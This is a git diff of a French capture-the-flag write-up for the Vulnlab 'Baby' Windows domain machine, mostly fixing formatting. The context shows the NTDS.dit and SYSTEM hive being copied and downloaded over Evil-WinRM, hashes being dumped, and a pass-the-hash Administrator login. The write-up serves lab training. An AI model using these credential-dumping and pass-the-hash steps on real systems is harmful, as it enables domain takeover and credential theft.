@@ -1,5 +1,5 @@
 ---
-title: baby - Easy
+title: Baby - Easy
 description: WU baby - Easy
 categories: [Writeup]
 tags: [writeup]
@@ -8,14 +8,14 @@ template: doc
 Date : 2024-09-10 11:04
 
 ## 🔭 Périmètre
-
+```
 IP: 10.10.124.47
 OS: Windows
 Domaine: baby.vl
-
+```
 ## 🔍 Récupération d'informations 
 
-### PortScan:
+### PortScan
 
 
 ```shell wrap
@@ -45,7 +45,7 @@ PORT      STATE SERVICE    VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-### Reconnaissance:
+### Reconnaissance
 
 En voyant le `port 389` d'ouvert je décide d'utiliser `ldapsearch` pour voir si je peux récupérer les informations de l'annuaire LDAP.
 
@@ -245,12 +245,12 @@ The shadow copy was successfully exposed as z:\.
 ```
 
 Une fois le script correctement exécuter nous pouvons récupérer les fichiers `ntds` et `system`:
-
+```shell wrap
 *Evil-WinRM* PS C:\Temp> robocopy \B Z:\Windows\NTDS . ntds.dit
 *Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system
 *Evil-WinRM* PS C:\Temp> download ntds.dit
 *Evil-WinRM* PS C:\Temp> download system
-
+```
 Les fichiers `ntds.dit` et `system` nous permettent d'obtenir les hashes des utilisateurs:
 
 ```shell wrap
@@ -319,10 +319,10 @@ baby.vl\Caroline.Robinson:des-cbc-md5:fd40190d579138df
 [*] Cleaning up... 
 ```
 
-Le hash d'`Administrator` obtenu il suffit de se connecter avec:
+Le hash d'`Administrator` obtenu, il suffit de se connecter avec:
 
 ```shell wrap
-[Sep 09, 2024 - 22:37:33 (CEST)] exegol-Vulnlab /workspace # evil-winrm -u 'Administrator' -H '<retracted>' -i 10.10.124.47
+[Sep 09, 2024 - 22:37:33 (CEST)] exegol-Vulnlab /workspace# evil-winrm -u 'Administrator' -H '<retracted>' -i 10.10.124.47
                                         
 Evil-WinRM shell v3.5
                                         
@@ -340,3 +340,4 @@ Info: Establishing connection to remote endpoint
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 -a----        11/21/2021   3:22 PM             36 root.txt
+```
